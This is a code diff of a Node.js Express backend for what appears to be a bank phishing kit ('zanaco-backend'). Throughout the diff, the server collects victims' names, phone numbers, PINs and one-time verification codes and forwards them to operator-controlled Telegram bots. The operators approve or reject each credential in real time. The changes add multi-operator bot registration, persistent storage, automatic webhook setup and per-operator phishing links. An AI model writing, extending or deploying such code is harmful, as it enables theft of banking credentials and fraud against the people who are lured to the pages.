@@ -3,29 +3,33 @@ const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+const BOTS_FILE = path.join(__dirname, 'bots.json');
 
 // ---------------- MEMORY STORES ----------------
-const approvedPins = {};      // requestId -> true/false/null
-const approvedCodes = {};     // requestId -> true/false/null
-const requestBotMap = {};     // requestId -> botId
+const approvedPins = {};
+const approvedCodes = {};
+const requestBotMap = {};
 
 // ---------------- MULTI-BOT STORE ----------------
-const bots = [
-    {
-        botId: 'bot1',
-        botToken: process.env.BOT1_TOKEN,
-        chatId: process.env.BOT1_CHATID
-    },
-    {
-        botId: 'bot2',
-        botToken: process.env.BOT2_TOKEN,
-        chatId: process.env.BOT2_CHATID
+let bots = [];
+if (fs.existsSync(BOTS_FILE)) {
+    try {
+        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
+        console.log('✅ Bots loaded from bots.json:', bots);
+    } catch {
+        bots = [];
     }
-];
-
+} else {
+    bots = [
+        { botId: 'bot1', botToken: process.env.BOT1_TOKEN, chatId: process.env.BOT1_CHATID },
+        { botId: 'bot2', botToken: process.env.BOT2_TOKEN, chatId: process.env.BOT2_CHATID }
+    ];
+    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
+}
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json());
@@ -36,45 +40,57 @@ app.use(express.static('public'));
 function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
+function saveBots() {
+    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
+}
 
+// ---------------- TELEGRAM HELPERS ----------------
 async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
     try {
         await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
-            {
-                chat_id: bot.chatId,
-                text,
-                reply_markup: { inline_keyboard: inlineKeyboard }
-            }
+            { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: inlineKeyboard } }
         );
-        console.log(`✅ Telegram message sent by ${bot.botId}`);
     } catch (err) {
-        console.error(`❌ Telegram send error [${bot.botId}]:`, err.response?.data || err.message);
+        console.error(err.response?.data || err.message);
     }
 }
-
 async function answerCallback(bot, callbackId) {
     try {
         await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
             { callback_query_id: callbackId }
         );
-        console.log(`✅ Callback answered for ${bot.botId}: ${callbackId}`);
     } catch (err) {
-        console.error(`❌ Telegram callback error [${bot.botId}]:`, err.response?.data || err.message);
+        console.error(err.response?.data || err.message);
+    }
+}
+
+// ---------------- AUTO-SET WEBHOOKS ----------------
+async function setWebhookForBot(bot) {
+    try {
+        if (!bot.botToken || !bot.botId) return;
+        const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${bot.botId}`;
+        const resp = await axios.get(
+            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`
+        );
+        console.log(`✅ Webhook auto-set for ${bot.botId}:`, resp.data);
+    } catch (err) {
+        console.error(`❌ Failed to set webhook for ${bot.botId}:`, err.response?.data || err.message);
+    }
+}
+async function setWebhooksForAllBots() {
+    for (const bot of bots) {
+        await setWebhookForBot(bot);
     }
 }
 
 // ---------------- DYNAMIC PAGE SERVING ----------------
-// Serve index.html or other pages with botId in URL
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).send('Invalid bot link');
-
-    // Serve index.html first
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.redirect(`/index.html?botId=${bot.botId}`);
 });
-
 app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
@@ -90,18 +106,13 @@ app.post('/submit-pin', (req, res) => {
     approvedPins[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    sendTelegramMessage(
-        bot,
-        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
-        [[
-            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
-        ]]
-    );
+    sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
+        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
+    ]]);
 
     res.json({ requestId });
 });
-
 app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[req.params.requestId] ?? null });
 });
@@ -116,18 +127,13 @@ app.post('/submit-code', (req, res) => {
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    sendTelegramMessage(
-        bot,
-        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
-        [[
-            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
-        ]]
-    );
+    sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
+        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
+        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
+    ]]);
 
     res.json({ requestId });
 });
-
 app.get('/check-code/:requestId', (req, res) => {
     res.json({ approved: approvedCodes[req.params.requestId] ?? null });
 });
@@ -154,27 +160,25 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 app.post('/add-bot', async (req, res) => {
     const { botId, botToken, chatId } = req.body;
     if (!botId || !botToken || !chatId) return res.status(400).json({ error: 'botId, botToken, chatId required' });
-
     if (getBot(botId)) return res.status(400).json({ error: 'Bot already exists' });
 
     bots.push({ botId, botToken, chatId });
+    saveBots();
 
     const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`;
     try {
-        const resp = await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook set for ${botId}:`, resp.data);
-    } catch (err) {
-        console.error('❌ Failed to set webhook:', err.response?.data || err.message);
+        await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
+    } catch {
         return res.status(500).json({ error: 'Failed to set webhook' });
     }
 
-    res.json({
-        ok: true,
-        botLink: `https://zanaco-backend.onrender.com/bot/${botId}`
-    });
+    res.json({ ok: true, botLink: `https://zanaco-backend.onrender.com/bot/${botId}` });
 });
 
+// ---------------- DEBUG ----------------
+app.get('/debug/bots', (req, res) => res.json(bots));
+
 // ---------------- START SERVER ----------------
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+setWebhooksForAllBots().then(() => {
+    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
 });
